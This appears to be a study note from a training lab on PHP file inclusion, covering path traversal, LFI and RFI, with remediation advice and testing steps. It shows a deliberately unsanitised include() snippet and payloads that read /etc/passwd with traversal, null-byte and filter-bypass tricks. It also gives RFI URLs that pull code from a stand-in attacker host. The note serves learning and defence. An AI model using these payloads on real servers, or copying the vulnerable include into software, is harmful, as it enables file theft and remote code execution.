# File Inclusion
|-> **Local File Inclusion (LFI)** <br>
|-> **Remote File Inclusion (RFI)** <br>
|-> **Directory Traversal**

<p align="center">
  <img src="https://github.com/PranjalBasak/Documentation/assets/66166653/03a1db1f-9669-4348-9c2b-e9b3056ad3fb" alt="Anatomy of a Get Request to Access a File">
</p>
<p align="center">
  <em>Fig: Anatomy of a Get Request to Access a File</em>
</p>

<p align="center">
  <img src="https://github.com/PranjalBasak/Documentation/assets/66166653/14628d7f-7f11-463f-bb40-ee6bf8154c35" alt="How A Request Works">
</p>
<p align="center">
  <em>Fig: How A Request Works</em>
</p>

**Cause:** 
<br> The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them.
<br>
**Risk:** 
<br> An attacker can access any file in the web server or the operating system including source code using the vulnerablity. 
<br> They can even perform RCE by uploading their own files to the server.

## Path Traversal
AKA _**Directory Traversal/Dot-Dot-Slash Attack**_ <br>
This attack allows a hacker unauthorized access to operating system filee outside the web application's root directory.

In PHP, you can use the [`file_get_contents`](https://www.php.net/manual/en/function.file-get-contents.php) to read the content of a file.

**Example:** `http://webapp.thm/get.php?file=../../../../etc/passwd`

![image](https://github.com/PranjalBasak/Documentation/assets/66166653/eab139b1-d196-46eb-87f7-952d3f212e60)

## Local File Inclusion (LFI)
LFI is a vulnerability which allows attackers to retrive local files hosted in a web server and even execute malicious codes.

LFI can occur in web applications written in PHP, ASP, JSP, or even Node.js. In PHP, some functions contribute to the vulnerability of web applications including `include`, `require`, `include_once`, and `require_once`.

### Case 1: 
Let's say we have an web app which can switch between English and Arabian language. The PHP code is written as follows:
```php
<?PHP 
	include($_GET["lang"]);
?>
```

THE PHP code uses a GET request via the URL parameter `lang` to include the file of the page. We should have two kinds of requests:
- `http://webapp.thm/index.php?lang=EN.php`
- `http://webapp.thm/index.php?lang=AR.php`
But a malicious actor can read any file from the server using the vulnerable parameter `lang`, if there is no input validation and no directory specified in the `include` function. So an attacker can do:
`http://webapp.thm/get.php?file=/etc/passwd`

### Case 2: Bypass Invalid Extension
Use Null Bytes if the PHP code is configured in such a way that it will only accept a certain extension (such as only .php). In this case, a sample payload would be:
`http://webapp.thm/index.php?lang=../../../../etc/passwd%00`
Null byte will tell the PHP code to ignore anything after the null byte including the extension.

**NOTE:** the %00 trick is fixed and not working with PHP 5.3.4 and above.

## Case 3: Bypass A Filtered Keyword (`/etc/passwd`)
**Technique 1:** Use Null Bytes `%00`

**Technique 2:** Use `/.` in front of filtered keyword

## Case 4: Bypass A Filtered Keyword (Replaced `../` with Empty String)
![image](https://github.com/PranjalBasak/Documentation/assets/66166653/3f5b7720-b831-4e08-99b7-fe58342cc5f5)

## Case 5: Directory Specified
Considering the directory `languages` is specified,
Payload: `?lang=languages/../../../../../etc/passwd.`

## Remote File Inclusion (RFI)
RFI is an attack which allows an attacker to include remote files to the web application and execute malicious scripts in the server.

In RFI, one can inject an external URL into `include` function. But one requirement is that `allow_url_fopen` option needs to be `on`. RFI is deadlier than LFI since it allows RCE on the server. Other consequences include:
- Sensitive Information Disclosure
- Cross-Site Scripting (XSS)
- Denial of Service (DoS)

![image](https://github.com/PranjalBasak/Documentation/assets/66166653/9ed4aa3d-d153-403e-8f01-abc62626637e)
 Example Payload: 
 - `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
 -  `http://10.10.233.114/playground.php?file=http://10.17.42.103:4444/46635.py`

**Running A Simple HTTP Server Using Python3:** `python3 -m http.server 9000`

### Remediation

- Keep system and services, including web application frameworks, updated with the latest version.
- Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
- A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
- Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as `allow_url_fopen` on and `allow_url_include`.
- Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
- Never trust user input, and make sure to implement proper input validation against file inclusion.
- Implement whitelisting for file names and locations as well as blacklisting.

### Steps for testing for LFI
Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!
Enter a valid input to see how the web server behaves.
Enter invalid inputs, including special characters and common file names.
Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
Understand the input validation and if there are any filters!
Try the inject a valid entry to read sensitive files
